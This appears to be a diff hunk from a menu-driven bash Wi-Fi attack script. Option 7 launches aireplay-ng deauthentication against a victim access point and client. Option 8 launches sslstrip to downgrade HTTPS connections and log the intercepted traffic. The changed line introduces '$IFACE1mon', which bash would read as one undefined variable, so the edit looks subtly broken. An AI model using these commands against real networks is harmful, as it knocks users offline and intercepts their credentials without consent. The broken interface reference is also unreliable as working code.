@@ -74,7 +74,7 @@ menu()
     elif [[ $choice == 7 ]]; then
         get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
         get_name "STATION="; STATION=$USE
-        sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION wlan0mon &>/dev/null &
+        sudo xterm -bg black -fg blue -T "Aireplay" -geometry 90x20 -e aireplay-ng --deauth 1 -a $VICTIM_BSSID -c $STATION $IFACE1mon &>/dev/null &
     elif [[ $choice == 8 ]]; then
         echo -e "SSL Strip Log File\n" > $sessionfolder/ssl.log
     	sudo xterm -T "SSL Strip" -geometry 35x10 -e sslstrip -p -l 8080 -k -f lock.ico -w $sessionfolder/ssl.log &>/dev/null &
